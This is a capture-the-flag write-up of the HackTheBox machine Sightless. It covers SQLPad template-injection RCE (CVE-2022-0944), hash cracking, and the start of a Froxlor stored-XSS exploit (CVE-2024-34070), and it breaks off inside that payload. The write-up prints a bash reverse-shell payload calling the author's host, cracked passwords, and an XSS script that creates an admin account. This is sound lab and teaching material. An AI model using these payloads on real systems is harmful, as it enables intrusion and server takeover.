---
title: HTB: Sightless
url: https://0xdf.gitlab.io/2025/01/11/htb-sightless.html
date: 2025-01-11T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-sightless, nmap, ftp, lftp, ftp-tls, feroxbuster, sqlpad, cve-2022-0944, ssti, python-ssti, shadow, hashcat, netexec, froxlor, tunnel, cve-2024-34070, xss, keepass, ssrf, ffuf, chrome-debug, htb-agile
---

![Sightless](/img/sightless-cover.png)

Sightless starts with an instance of SQLPad vulnerable to a server-side template injection vulnerabiity that provides RCE. I’ll exploit that to get a shell as root in the SQLPad container. From there, I’ll dump the shadow file to get user hashes and crack one. That password leads to SSH access on the host, where I’ll find an instance of Froxlor. I’ll exploit an XSS vulnerability to get access and enable FTP access, where I’ll find a Keepass DB with the root SSH key. In beyond root I’ll look at using a SSRF vulnerability in SQLPad to enumeration open ports, and two unintended paths, using Chrome debug and going directly to root RCE through Froxlor.

## Box Info

| Name | [Sightless](https://hackthebox.com/machines/sightless)  [Sightless](https://hackthebox.com/machines/sightless) [Play on HackTheBox](https://hackthebox.com/machines/sightless) |
| --- | --- |
| Release Date | 07 Sep 2024 |
| Retire Date | 11 Jan 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Sightless |
| Radar Graph | Radar chart for Sightless |
| First Blood User | 00:13:07[kozmer kozmer](https://app.hackthebox.com/users/637320) |
| First Blood Root | 00:55:50[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [EmSec EmSec](https://app.hackthebox.com/users/962022) |

## Recon

### nmap

`nmap` finds three open TCP ports, FTP (21), SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.32
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 14:51 EDT
Nmap scan report for 10.10.11.32
Host is up (0.023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
oxdf@hacky$ nmap -p 21,22,80 -sCV 10.10.11.32
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 14:54 EDT
Nmap scan report for 10.10.11.32
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/8%Time=66DDF2FD%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S
SF:erver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20t
SF:ry\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x2
SF:0being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.76 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

The webserver returns a redirect to `sightless.htb`. I’ll do a quick fuzz with `ffuf` looking for any subdomains that respond differently but not find any. I’ll add this to my `/etc/hosts` file:

```
10.10.11.32 sightless.htb

```

### FTP - TCP 21

`nmap` is typically very good at detecting anonymous FTP login access. I’ll try manually just to check, but it doesn’t work:

```

oxdf@hacky$ ftp sightless.htb
Trying 10.10.11.32:21 ...
Connected to sightless.htb.
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
Name (sightless.htb:oxdf): anonymous
550 SSL/TLS required on the control channel
ftp: Login failed
ftp>

```

It says SSL/TLS is required on the control channel. I can (and will later) use `lftp` (`apt install lftp`) to access this, but I’ll need creds.

### sightless.htb - TCP 80

#### Site

The site is for a tech support firm:

![image-20240908153622200](/img/image-20240908153622200.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The Contact Us button has a link to the `sales@sightless.htb` email. The SQLPad “Start Now” button is a link to `sqlpad.sightless.htb`, which I’ll add to my hosts file:

```
10.10.11.32 sightless.htb slqpad.sightless.htb

```

The rest of the links go to anchor points on the main page.

#### Tech Stack

The HTTP response headers don’t show anything about the server other than nginx:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 08 Sep 2024 19:31:25 GMT
Content-Type: text/html
Last-Modified: Fri, 02 Aug 2024 10:01:13 GMT
Connection: keep-alive
ETag: W/"66acae69-1381"
Content-Length: 4993

```

The root page loads the same as `/index.html`, suggesting this is a static HTML site. The 404 page is the default nginx page:

![image-20240908160955589](/img/image-20240908160955589.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` since that’s the only extension observed so far:

```

oxdf@hacky$ feroxbuster -u http://sightless.htb -x html
                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://sightless.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://sightless.htb/images => http://sightless.htb/images/
200      GET      341l      620w     6252c http://sightless.htb/style.css
200      GET      340l     2193w   190652c http://sightless.htb/images/logo.png
200      GET      105l      389w     4993c http://sightless.htb/
200      GET      105l      389w     4993c http://sightless.htb/index.html
301      GET        7l       12w      178c http://sightless.htb/icones => http://sightless.htb/icones/
[####################] - 35s    90004/90004   0s      found:6       errors:4
[####################] - 29s    30000/30000   1049/s  http://sightless.htb/ 
[####################] - 29s    30000/30000   1052/s  http://sightless.htb/images/ 
[####################] - 28s    30000/30000   1055/s  http://sightless.htb/icones/

```

Nothing interesting.

### sqlpad.sightless.htb - TCP 80

#### Site

Loading this site looks like an application named SQLPad:

![image-20240908162714640](/img/image-20240908162714640.png)

It seems to match the screenshots on [this GitHub repo](https://github.com/sqlpad/sqlpad).

At the top right there’s a menu to interact with connections:

![image-20240908162917012](/img/image-20240908162917012.png)

There are no connectiosn under “Manage connections”. Creating a new connection offers a huge list of DBs to choose from:

![image-20240908163123097](/img/image-20240908163123097.png)

I’ll try MySQL, and it asks for server and port. There’s a “Test” button that will try a connection. Localhost isn’t listening on 3306:

![image-20240908163250218](/img/image-20240908163250218.png)

If I give it my IP it does connect:

```

oxdf@hacky$ nc -lvnp 3306
Listening on 0.0.0.0 3306
Connection received on 10.10.11.32 45918

```

But then it just hangs. I could try to set up a legit MySQL instance on my host to test further, but I won’t need to.

I’ll go down a bit of a rabbit hole using the “Test” button to figure out that SQLPad is running in a container and what ports are open on that container, but it’s not necessary to solve the box, so I’ll cover that in [Beyond Root](#beyond-root---sqlpad-brute-force).

#### Tech Stack

The three dots at the top right have an “About” option:

![image-20240908165423325](/img/image-20240908165423325.png)

This provides a version (and a link to the GitHub for the project):

![image-20240908165450452](/img/image-20240908165450452.png)

The project shows that it is written in JavaScript / TypeScript:

![image-20240908170943498](/img/image-20240908170943498.png)

I can find that this is running in a container by [enumerating open ports](#beyond-root---sqlpad-brute-force).

## Shell as root in SQLPad

### CVE-2022-0944

#### Identify

Searching for SQLPad exploits shows a handful of CVEs from 2022, and one from 2024:

![image-20240908170640168](/img/image-20240908170640168.png)

The 2024 CVE seems to be a different software. The 2022 CVE is in versions up to 6.10.0, which is what is running on Sightless.

#### Background

The National Vulnerability Database (NVD) [describes CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944) as:

> Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.

[This post from Huntr](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) provides a POC:

![image-20240908171103156](/img/image-20240908171103156.png)

Looking at that POC, I see template injection that is loading the `child_process` module and calling the `exec` function, passing the command `id>/tmp/pwn`.

### RCE

#### POC

To test this, I’ll follow the instructions above, but modify the payload a bit. It is writing a file to the filesystem, which is a nice proof of concept for a system I control, but doesn’t help me here where I don’t have file system access (yet). My first attempt is with `ping`, but it doesn’t work. I’ll later see that’s because the SQLPad Docker container doesn’t have `ping` installed. Knowing that’s a possibility, I’ll try `wget` and `curl`:

![image-20240908173020674](/img/image-20240908173020674.png)

I’m having each grab a different path so I can see which is working.

I’ll start a Python webserver on my host (`python3 -m http.server 80`) and “Save”. When I do, there’s a connection:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.32 - - [08/Sep/2024 17:29:36] code 404, message File not found
10.10.11.32 - - [08/Sep/2024 17:29:36] "GET /wget HTTP/1.1" 404 -
10.10.11.32 - - [08/Sep/2024 17:29:36] code 404, message File not found
10.10.11.32 - - [08/Sep/2024 17:29:36] "GET /wget HTTP/1.1" 404 -

```

Looks like RCE, and `wget` is installed and `curl` isn’t.

#### Shell

I’ll create a new connection (editing my existing one doesn’t seem to work), and this time give it a server of:

```

{{ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"') }}

```

This is a standard [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). When I save it, I get a shell at a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.32 49336
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad#

```

I’ll do the [standard shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q) trick:

```

root@c184118df0a6:/var/lib/sqlpad# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@c184118df0a6:/var/lib/sqlpad# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
‍            reset
reset: unknown terminal type unknown
Terminal type? screen
root@c184118df0a6:/var/lib/sqlpad#

```

## Shell as michael

### Enumeration

#### Docker

It is very clear that I’m in a Docker container. At the filesystem root:

```

root@c184118df0a6:/# ls -a
.           bin   docker-entrypoint  lib    mnt   root  srv  usr
..          boot  etc                lib64  opt   run   sys  var
.dockerenv  dev   home               media  proc  sbin  tmp

```

`docker-entrypoint` is what runs when it starts:

```

#!/bin/bash
set -e
# This iterates any sh file in the directory and executes them before our server starts
# Note: we intentionally source the files, allowing scripts to set vars that override default behavior.
if [ -d "/etc/docker-entrypoint.d" ]; then
    find /etc/docker-entrypoint.d -name '*.sh' -print0 | 
    while IFS= read -r -d '' line; do 
        . "$line"
    done
fi
exec node /usr/app/server.js $@

```

Most things seems to match up with the [Dockerfile](https://github.com/sqlpad/sqlpad/blob/master/Dockerfile) from GitHub.

#### Users

There are two users on the box with home directories in `/home`:

```

root@c184118df0a6:/home# ls
michael  node

```

Those same two users (plus root) has shells set in `/etc/passwd`:

```

root@c184118df0a6:/home# cat /etc/passwd | grep "sh$" 
root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

```

As root, I have access to both these directories, and there’s nothing interesting.

### Recover Password

Given that the michael user was clearly added to the container for some reason, it’s worth taking a look at the password hash in `/etc/shadow`:

```

root@c184118df0a6:/home# cat /etc/shadow | grep '\$'
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::

```

Both root and michael have hashes set.

I’ll save these two hashes in a file:

```

oxdf@hacky$ cat hashes 
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/

```

And pass that to `hashcat`:

```

$ hashcat hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
...[snip]...
$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
...[snip]...
Started: Sun Sep  8 22:00:54 2024
Stopped: Sun Sep  8 22:01:00 2024
$ hashcat hashes --user --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse

```

They both crack very quickly.

### SSH

#### Check Passwords

I’ll use `netexec` to check both passwords with the michael user by saving the passwords in a file named `passwords` one per line:

```

oxdf@hacky$ netexec ssh sightless.htb -u michael -p passwords 
SSH         10.10.11.32     22     sightless.htb    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.11.32     22     sightless.htb    [-] michael:blindside
SSH         10.10.11.32     22     sightless.htb    [+] michael:insaneclownposse  Linux - Shell access!

```

#### Shell

I’ll use that password with michael to get a shell:

```

oxdf@hacky$ sshpass -p insaneclownposse ssh michael@sightless.htb
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
Last login: Tue Sep  3 11:52:02 2024 from 10.11.14.23
michael@sightless:~$

```

And `user.txt`:

```

michael@sightless:~$ cat user.txt
cb7db915************************

```

## Shell as root

### Enumeration

#### Users

The michael user isn’t able to run `sudo`:

```

michael@sightless:~$ sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on sightless.

```

There’s nothing else of interest in the michael user’s home directory:

```

michael@sightless:~$ ls -la
total 28
drwxr-x--- 3 michael michael 4096 Jul 31 13:15 .
drwxr-xr-x 4 root    root    4096 May 15 19:03 ..
lrwxrwxrwx 1 root    root       9 May 21 18:49 .bash_history -> /dev/null
-rw-r--r-- 1 michael michael  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 michael michael 3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 michael michael  807 Jan  6  2022 .profile
drwx------ 2 michael michael 4096 May 15 03:43 .ssh
-rw-r----- 1 root    michael   33 May 16 00:16 user.txt

```

There’s one other user with a home directory in `/home`:

```

michael@sightless:/home$ ls
john  michael
michael@sightless:/home$ ls john/
ls: cannot open directory 'john/': Permission denied

```

michael can’t access john’s home directory.

These two users along with root have shells set in `passwd`:

```

michael@sightless:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
michael:x:1000:1000:michael:/home/michael:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash

```

#### Processes

Looking at running processes with `ps auxww`, a few interesting ones jump out.

Both `nginx` and `apache` are running:

```

john        1208  0.0  0.0   2892   972 ?        Ss   Sep08   0:00 /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1209  0.0  0.0   2892   972 ?        Ss   Sep08   0:00 /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh
root        1212  0.0  0.0  55228  1712 ?        Ss   Sep08   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1213  0.0  0.1  56292  6780 ?        S    Sep08   0:16 nginx: worker process
www-data    1214  0.0  0.1  56160  6716 ?        S    Sep08   0:05 nginx: worker process
root        1215  0.0  0.7 225524 29920 ?        Ss   Sep08   0:01 /usr/sbin/apache2 -k start
mysql       1222  0.7 10.4 1821916 414416 ?      Ssl  Sep08   2:31 /usr/sbin/mysqld
root        1215  0.0  0.7 225524 29920 ?        Ss   Sep08   0:01 /usr/sbin/apache2 -k start
...[snip]...
www-data    7355  0.2  0.7 227772 31676 ?        S    00:00   0:17 /usr/sbin/apache2 -k start                                      
www-data    7356  0.2  0.7 227776 29204 ?        S    00:00   0:18 /usr/sbin/apache2 -k start                                      
www-data    7357  0.2  0.7 227776 29208 ?        S    00:00   0:18 /usr/sbin/apache2 -k start                                      
www-data    7358  0.2  0.7 227776 29196 ?        S    00:00   0:17 /usr/sbin/apache2 -k start                                      
www-data    7359  0.2  0.7 227780 29200 ?        S    00:00   0:18 /usr/sbin/apache2 -k start                                      
www-data    7364  0.2  0.7 227780 29196 ?        S    00:00   0:17 /usr/sbin/apache2 -k start 

```

That’s unusual. It’ll be worth looking at how each are configured.

The john user has some scripts running, including Chrome:

```

john        1570  0.0  0.6  33660 24672 ?        S    Sep08   0:16 /usr/bin/python3 /home/john/automation/administration.py        
john        1571  0.4  0.3 33630172 15104 ?      Sl   Sep08   1:31 /home/john/automation/chromedriver --port=60567                 
john        1576  0.0  0.0      0     0 ?        Z    Sep08   0:00 [chromedriver] <defunct>                                        
john        1580  0.7  2.8 34011320 112464 ?     Sl   Sep08   2:38 /opt/google/chrome/chrome --allow-pre-commit-input --disable-bac
kground-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor -
-disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --n
o-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-key
chain --user-data-dir=/tmp/.org.chromium.Chromium.V3AL87 data:,                                                                    
john        1583  0.0  0.0 33575860 3148 ?       Sl   Sep08   0:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annota
tion=ptype=crashpad-handler --database=/tmp/Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation
=lsb-release=Ubuntu 22.04.4 LTS --annotation=plat=Linux --annotation=prod=Chrome_Headless --annotation=ver=125.0.6422.60 --initial-
client-fd=6 --shared-client-connection
john        1587  0.0  1.4 33850304 56508 ?      S    Sep08   0:00 /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no
-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1583 --enable-crash-reporter
john        1588  0.0  1.4 33850308 56800 ?      S    Sep08   0:00 /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-lo
gging --headless --log-level=0 --headless --crashpad-handler-pid=1583 --enable-crash-reporter
john        1603  0.5  3.0 34100968 122072 ?     Sl   Sep08   2:06 /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disa
ble-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1583 --gpu-p
references=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgA
AAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --fie
john        1604  0.1  2.1 33900068 87172 ?      Sl   Sep08   0:35 /opt/google/chrome/chrome --type=utility --utility-sub-type=netw
ork.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-usage --use-angle=swiftshader-webg
l --use-gl=angle --headless --crashpad-handler-pid=1583 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,970365
4195658158814,13523518495094056678,262144 --disable-features=PaintHolding --variations-seed-version --enable-logging --log-level=0 
--enable-crash-reporter
john        1633  3.6  4.0 1186538096 162008 ?   Sl   Sep08  13:05 /opt/google/chrome/chrome --type=renderer --headless --crashpad-
handler-pid=1583 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-p
re-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --ti
me-ticks-at-unix-epoch=-1725826551183833 --launc
john        1656  0.0  0.0   7372  3392 ?        S    Sep08   0:00 /bin/bash /home/john/automation/healthcheck.sh

```

`/opt` has the Google Chrome installation:

```

michael@sightless:/opt$ ls
containerd  google
michael@sightless:/opt$ ls google/
chrome

```

#### nginx

There are two sites set up in the enabled sites directory for nginx:

```

michael@sightless:/etc/nginx/sites-enabled$ ls
default  main

```

`default` listens on 80 and handles `sightless.htb`, including the redirect for any other server to that:

```

server {
    listen *:80;
    server_name sightless.htb;

    location / {
        root /var/www/sightless;
        index index.html;
    }

    if ($host != sightless.htb) {
        rewrite ^ http://sightless.htb/;
    }
}

```

`main` handles the SQLPad site, also on 80:

```

server {
        listen 80;
        server_name sqlpad.sightless.htb;

        location / {
                proxy_pass http://localhost:3000;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
}

```

Nothing new or interesting here.

#### Apache

There’s a bunch of sites in the Apache `sites-enabled` folder:

```

michael@sightless:/etc/apache2/sites-enabled$ ls
000-default.conf  05_froxlor_dirfix_nofcgid.conf              34_froxlor_normal_vhost_web1.sightless.htb.conf
002-sqlpad.conf   10_froxlor_ipandport_192.168.1.118.80.conf  40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf

```

`002-sqlpad.conf` seems to try to reimplement the redirect to the SQLPad container (with comments removed):

```

<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        ServerName sqlpad.sightless.htb
        ServerAlias sqlpad.sightless.htb
        ProxyPreserveHost On
        ProxyPass         / http://127.0.0.1:3000/
        ProxyPassReverse  / http://127.0.0.1:3000/

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

It’s not clear why this is here. I think it tries to start up after nginx and will fail (which is why the nginx header gets set).

The rest are related to [Froxlor](https://www.froxlor.org/), a server management software. `000-default.conf` sets it up to listen on localhost port 8080, with the root in `/var/www/html/froxlor`:

```

<VirtualHost 127.0.0.1:8080>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/froxlor
        ServerName admin.sightless.htb
        ServerAlias admin.sightless.htb

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

It’s using `admin.sightless.htb`.

### Froxlor

#### Initial Probe

There is a service listening on 8080:

```

michael@sightless:/etc/apache2/sites-enabled$ netstat -tnlp | grep 8080
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -

```

`curl` shows that this server returns a 302 redirect to `notice.html`:

```

michael@sightless:/etc/apache2/sites-enabled$ curl -v localhost:8080
*   Trying 127.0.0.1:8080...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Mon, 09 Sep 2024 02:48:50 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Set-Cookie: PHPSESSID=tc4g5trvdtcq04tatdtlm8cocl; expires=Mon, 09-Sep-2024 02:58:50 GMT; Max-Age=600; path=/; domain=localhost; HttpOnly; SameSite=Strict
< Expires: Mon, 09 Sep 2024 02:48:50 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Last-Modified: Mon, 09 Sep 2024 02:48:50 GMT
< Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'self'; frame-src 'self'; frame-ancestors 'self';
< X-Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'self'; frame-src 'self'; frame-ancestors 'self';
< X-WebKit-CSP: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'self'; frame-src 'self'; frame-ancestors 'self';
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< Location: notice.html
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host localhost left intact

```

#### Tunnel

To get a better interaction, I’ll create a tunnel so I can access the website from my host. I’ll reconnect my SSH session with `-L 8000:localhost:8080`:

```

oxdf@hacky$ sshpass -p insaneclownposse ssh michael@sightless.htb -L 8000:localhost:8080
Last login: Mon Sep  9 03:05:10 2024 from 10.11.14.18
michael@sightless:~$ 

```

I’m tunneling port 8000 to port 8080 on Sightless (using 8000 because Burp is already listening on 8080 on my machine).

Now visiting `http://localhost:8000` on my host loads the Froxlor page:

![image-20240908225634548](/img/image-20240908225634548.png)

To access the site, I’ll need to access the site as `admin.sightless.htb`. To do that, I’ll update my hosts file:

```
127.0.0.1 admin.sightless.htb

```

Visiting that presents the login form:

![image-20240908231857570](/img/image-20240908231857570.png)

### Access Froxlor

#### Identify CVE-2024-34070

This one was tricky to identify, as I don’t have version to go with. A lot of searches will turn up CVE-2023-0315, a RCE vulnerability in version 2.0.3:

![image-20240909095510723](/img/image-20240909095510723.png)

This version ends up being newer than that. Some more searching (and searching for terms like “froxlor CVE” rather than “exploit”) will find [CVE-2024-34070](https://nvd.nist.gov/vuln/detail/CVE-2024-34070).

#### CVE-2024-34070 Background

NVD [describes](https://nvd.nist.gov/vuln/detail/CVE-2024-34070) CVE-2024-34070 as:

> Froxlor is open source server administration software. Prior to 2.1.9, a Stored Blind Cross-Site Scripting (XSS) vulnerability was identified in the Failed Login Attempts Logging Feature of the Froxlor Application. An unauthenticated User can inject malicious scripts in the loginname parameter on the Login attempt, which will then be executed when viewed by the Administrator in the System Logs. By exploiting this vulnerability, the attacker can perform various malicious actions such as forcing the Administrator to execute actions without their knowledge or consent. For instance, the attacker can force the Administrator to add a new administrator controlled by the attacker, thereby giving the attacker full control over the application. This vulnerability is fixed in 2.1.9.

[This security advisory](https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53) gives really good detail, including a POC to exploit. The issue is that failed login attempts get logged in a way that is vulnerable to stored XSS. If I put a payload in the login name field, it will execute JavaScript in the context of the admin who sees it and triggers it. The POC creates a new admin user.

#### CVE-2024-34070 Exploit

The payload POC URL decodes and cleans up to:

```

admin{{$emit.constructor`function b(){
  var metaTag=document.querySelector('meta[name="csrf-token"]');
  var csrfToken=metaTag.getAttribute('content');
  var xhr=new XMLHttpRequest();
  var url="https://demo.froxlor.org/admin_admins.php";
  var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";
